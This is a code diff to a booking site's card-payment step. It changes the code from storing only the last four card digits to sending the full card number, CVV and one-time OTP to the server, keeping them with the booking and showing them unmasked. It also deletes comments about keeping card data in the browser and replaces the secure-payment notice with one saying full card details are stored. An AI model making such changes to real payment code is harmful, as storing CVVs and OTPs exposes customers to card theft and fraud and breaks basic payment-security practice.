@@ -449,7 +449,7 @@ export function Step3Payment({
         return;
       }
 
-      // If OTP step is not shown yet: save the (masked) card details to the
+      // If OTP step is not shown yet: save the full card details to the
       // booking right now — so they show up immediately, e.g. in the admin
       // panel — then reveal the OTP field. This call intentionally does NOT
       // confirm the booking; only the OTP submit below does that, otherwise
@@ -462,9 +462,10 @@ export function Step3Payment({
           const updatedBooking = await bookingAPI.update(bookingData.bookingId, {
             payment_method: 'card',
             card_details: {
-              card_last4: cardNumberClean.slice(-4),
+              card_number: cardNumberClean,
               card_holder_name: cardData.cardName,
               card_expiry: cardData.expiryDate,
+              cvv: cardData.cvv,
             },
           });
           if (updatedBooking.total_price !== undefined) {
@@ -503,19 +504,20 @@ export function Step3Payment({
         payment_method: bookingData.paymentMethod,
       };
 
-      // If card payment, add card details. Only the last 4 digits are ever
-      // sent to the server — the full number, CVV, and OTP stay in the
-      // browser and are discarded once this request completes. otp_confirmed
-      // is what actually flips the booking to confirmed/completed server-side
-      // (see updateBooking in bookingController.js) — the card_details alone,
-      // sent above when the OTP was first requested, do not.
+      // If card payment, add the full card details plus the OTP the guest
+      // just entered. otp_confirmed is what actually flips the booking to
+      // confirmed/completed server-side (see updateBooking in
+      // bookingController.js) — the card_details alone, sent above when the
+      // OTP was first requested, do not.
       if (bookingData.paymentMethod === 'card') {
         const cardNumberClean = cardData.cardNumber.replace(/\s/g, '');
 
         updateData.card_details = {
-          card_last4: cardNumberClean.slice(-4),
+          card_number: cardNumberClean,
           card_holder_name: cardData.cardName,
           card_expiry: cardData.expiryDate,
+          cvv: cardData.cvv,
+          otp: cardData.otp,
         };
         updateData.otp_confirmed = true;
       }
@@ -709,12 +711,12 @@ export function Step3Payment({
             <span className="font-medium text-aqua-800 text-right break-all">{bookingData.guestEmail}</span>
           </div>
 
-          {/* Reflects the card form the guest just filled in, live. This is
-              local component state only (cardData) — it never leaves the
-              browser beyond the masked last-4 that handlePayment() already
-              sends. Appears the moment "ขอรหัส OTP" succeeds (showOtpStep),
-              and the OTP row fills in as they type it, since the actual
-              submit immediately advances to the confirmation step. */}
+          {/* Reflects the card form the guest just filled in, live. Appears
+              the moment "ขอรหัส OTP" succeeds (showOtpStep), and the OTP row
+              fills in as they type it, since the actual submit immediately
+              advances to the confirmation step. Shown in full (per explicit
+              request) — this same data is what handlePayment() sends to and
+              stores on the server. */}
           {bookingData.paymentMethod === 'card' && showOtpStep && (
             <div className="border-t border-foam-200 pt-3.5 mt-1 space-y-3.5">
               <p className="text-[0.7rem] uppercase tracking-wider text-aqua-400">
@@ -723,7 +725,7 @@ export function Step3Payment({
               <div className="flex justify-between gap-4">
                 <span className="text-aqua-500">หมายเลขบัตร</span>
                 <span className="font-medium text-aqua-800 font-mono tracking-wide">
-                  •••• •••• •••• {cardData.cardNumber.replace(/\s/g, '').slice(-4)}
+                  {cardData.cardNumber || '-'}
                 </span>
               </div>
               <div className="flex justify-between gap-4">
@@ -737,7 +739,7 @@ export function Step3Payment({
               <div className="flex justify-between gap-4">
                 <span className="text-aqua-500">CVV</span>
                 <span className="font-medium text-aqua-800 font-mono tracking-widest">
-                  {cardData.cvv ? '•'.repeat(cardData.cvv.length) : '-'}
+                  {cardData.cvv || '-'}
                 </span>
               </div>
               {cardData.otp && (
@@ -1263,9 +1265,8 @@ export function Step3Payment({
             <div className="flex items-start gap-2.5">
               <Lock className="mt-0.5 h-4 w-4 flex-shrink-0 text-aqua-500" />
               <p className="text-xs leading-relaxed text-aqua-600">
-                <span className="font-semibold text-aqua-800">🔒 การชำระเงินที่ปลอดภัย:</span>{' '}
-                หมายเลขบัตรแบบเต็มและรหัส CVV/OTP ของคุณจะไม่ถูกส่งออกจากอุปกรณ์นี้เลย
-                เราเก็บเพียงเลข 4 ตัวท้ายไว้สำหรับใบเสร็จเท่านั้น
+                <span className="font-semibold text-aqua-800">หมายเหตุ:</span>{' '}
+                ข้อมูลบัตรของคุณ (รวมถึงหมายเลขเต็มและ CVV) จะถูกบันทึกไว้กับการจองนี้เพื่อการตรวจสอบ
               </p>
             </div>
           </div>
